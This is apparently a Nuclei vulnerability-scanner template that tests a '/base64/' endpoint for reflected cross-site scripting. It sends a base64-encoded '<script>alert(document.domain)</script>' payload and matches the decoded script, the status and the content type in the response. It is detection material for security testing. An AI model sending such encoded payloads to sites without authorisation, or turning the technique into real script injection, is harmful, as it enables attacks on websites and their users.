id: xss-base64-generic-endpoint

info:
  name: Base64 XSS Endpoint
  author: joas santos
  severity: medium
  description: Cross-site scripting vulnerability in the base64 endpoint
  reference: https://hackerone.com/reports
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cwe-id: CWE-79
    
requests:
  - method: GET
    path:
      - "{{BaseURL}}/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "<script>alert(document.domain)</script>"
        part: body

      - type: status
        status:
          - 200

      - type: word
        words:
          - "text/html"
        part: header
